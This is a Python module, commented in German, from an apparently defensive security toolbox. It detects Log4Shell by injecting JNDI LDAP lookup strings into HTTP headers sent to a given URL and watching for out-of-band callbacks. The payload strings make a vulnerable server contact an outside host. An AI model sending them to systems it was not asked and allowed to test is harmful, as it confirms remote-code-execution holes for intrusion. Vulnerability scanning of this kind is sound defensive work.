"""Log4j-Vuln-Tester (Log4Shell / CVE-2021-44228): injiziert JNDI-
Teststrings in gaengige HTTP-Header und sendet sie an ein Ziel.

WICHTIG (Design-Entscheidung, bewusst so gehalten): dieses Tool
erfordert einen EIGENEN, vom Nutzer selbst kontrollierten Out-of-Band-
Callback-Server (z.B. interactsh, Canarytokens, oder selbst gehostet)
-- KEINE eingebaute Callback-Infrastruktur dieser Toolbox. Das Tool
sendet nur die Test-Payloads und meldet, WELCHE Header getestet
wurden -- es prueft selbst NICHT, ob ein Callback ankam (das passiert
asynchron, oft mit Verzoegerung, und auf dem Server des Nutzers, den
diese Toolbox nicht einsehen kann). Reine ERKENNUNG einer moeglichen
Schwachstelle (bestaetigt durch einen externen Callback-Treffer),
KEINE tatsaechliche Ausnutzung/Codeausfuehrung -- die Payloads
enthalten keine LDAP-Response-Poisoning-Logik oder Schadcode-Lieferung,
nur einen harmlosen JNDI-Lookup-Versuch.
"""

import secrets

import httpx
from pydantic import BaseModel, field_validator

from app.modules.base import ToolModule, register_module
from app.modules.dns.common import is_valid_hostname, is_valid_ip

TESTED_HEADERS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Api-Version",
    "X-Forwarded-Host",
    "X-Real-IP",
    "Accept-Language",
]


@register_module
class Log4jVulnTesterModule(ToolModule):
    slug = "log4j-vuln-tester"
    category = "security"
    name = "Log4j Vuln Tester (JNDI)"
    description = (
        "Injiziert JNDI-Teststrings in gaengige HTTP-Header, um Log4Shell (CVE-2021-44228) zu erkennen -- "
        "erfordert einen EIGENEN Out-of-Band-Callback-Server (z.B. interactsh, Canarytokens, oder selbst "
        "gehostet), dessen Domain hier angegeben wird. Ein eingehender Callback im eigenen Server-Log "
        "bestaetigt die Schwachstelle -- KEIN Callback ist KEIN Beweis der Abwesenheit (z.B. bei "
        "Egress-Filterung oder verzoegerter Verarbeitung)."
    )
    is_active_scan = False
    requires_admin = True
    timeout_seconds = 25

    class Input(BaseModel):
        url: str
        callback_domain: str

        @field_validator("url")
        @classmethod
        def validate_url(cls, v: str) -> str:
            v = v.strip()
            if not v.startswith(("http://", "https://")):
                v = f"https://{v}"
            host = v.split("://", 1)[1].split("/")[0].split("@")[-1].split(":")[0]
            if not (is_valid_hostname(host) or is_valid_ip(host)):
                raise ValueError("Ungueltige Ziel-URL")
            return v

        @field_validator("callback_domain")
        @classmethod
        def validate_callback_domain(cls, v: str) -> str:
            v = v.strip().rstrip(".")
            # Falls versehentlich mit Schema/Pfad eingefuegt (z.B. aus einem
            # kopierten interactsh-Link) -- nur den Hostname-Teil behalten.
            if "://" in v:
                v = v.split("://", 1)[1]
            v = v.split("/")[0]
            if not is_valid_hostname(v):
                raise ValueError("Ungueltige Callback-Domain")
            return v

    class HeaderTest(BaseModel):
        header: str
        payload: str

    class Output(BaseModel):
        target: str
        callback_domain: str
        session_marker: str
        tested_headers: list["Log4jVulnTesterModule.HeaderTest"]
        requests_sent: int
        note: str

    async def run(self, data: "Log4jVulnTesterModule.Input") -> "Log4jVulnTesterModule.Output":
        # Ein Marker pro Test-Lauf, PLUS ein eigener Sub-Marker pro
        # Header -- so laesst sich im Callback-Log genau erkennen, UEBER
        # WELCHEN Header der Treffer kam, falls mehrere Header
        # verwundbare Stellen sind.
        session_marker = secrets.token_hex(6)

        tested: list[Log4jVulnTesterModule.HeaderTest] = []
        async with httpx.AsyncClient(timeout=self.timeout_seconds, verify=False, follow_redirects=True) as client:
            for i, header_name in enumerate(TESTED_HEADERS):
                sub_marker = f"{session_marker}{i:02d}"
                payload = f"${{jndi:ldap://{sub_marker}.{data.callback_domain}/a}}"
                try:
                    await client.get(data.url, headers={header_name: payload})
                except httpx.HTTPError:
                    # Zaehlt trotzdem als "gesendet" -- der Payload wurde
                    # uebertragen, auch wenn die Verbindung serverseitig
                    # danach abbricht (z.B. weil die Anwendung beim
                    # Verarbeiten des Headers abstuerzt -- das waere
                    # selbst schon ein interessantes Signal).
                    pass
                tested.append(self.HeaderTest(header=header_name, payload=payload))

        return self.Output(
            target=data.url,
            callback_domain=data.callback_domain,
            session_marker=session_marker,
            tested_headers=tested,
            requests_sent=len(tested),
            note=(
                "Pruefe jetzt dein Callback-Server-Log auf eingehende DNS-/LDAP-Anfragen mit einem der "
                "obigen Marker-Praefixe. Ein Treffer bestaetigt die Schwachstelle fuer den jeweiligen "
                "Header. Callbacks koennen verzoegert eintreffen -- mehrfach pruefen. KEIN Callback "
                "beweist NICHT, dass das System sicher ist (z.B. bei Egress-Filterung)."
            ),
        )
